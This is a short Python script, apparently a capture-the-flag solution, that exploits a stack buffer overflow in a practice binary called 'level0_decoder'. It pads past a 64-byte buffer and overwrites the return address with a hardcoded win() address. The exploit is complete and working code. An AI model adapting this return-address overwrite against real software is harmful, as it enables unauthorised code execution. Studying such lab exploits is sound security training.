#!/usr/bin/env python3
"""
level0_decoder exploit: stack buffer overflow (strcpy into buf[64]) -> ret2win.

buf lives at rbp-0x40, saved rbp at rbp, return address at rbp+0x8.
So offset from start of buf to the saved return address = 0x40 + 8 = 72 bytes.
No PIE, no canary -> we can hardcode win()'s address (0x4011b6) directly.
"""
import struct
import subprocess

WIN_ADDR = 0x4011b6
OFFSET = 72

payload = b"A" * OFFSET + struct.pack("<Q", WIN_ADDR)

result = subprocess.run(
    ["./level0_decoder", "-"],
    input=payload,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
)

print(result.stdout.decode(errors="replace"))
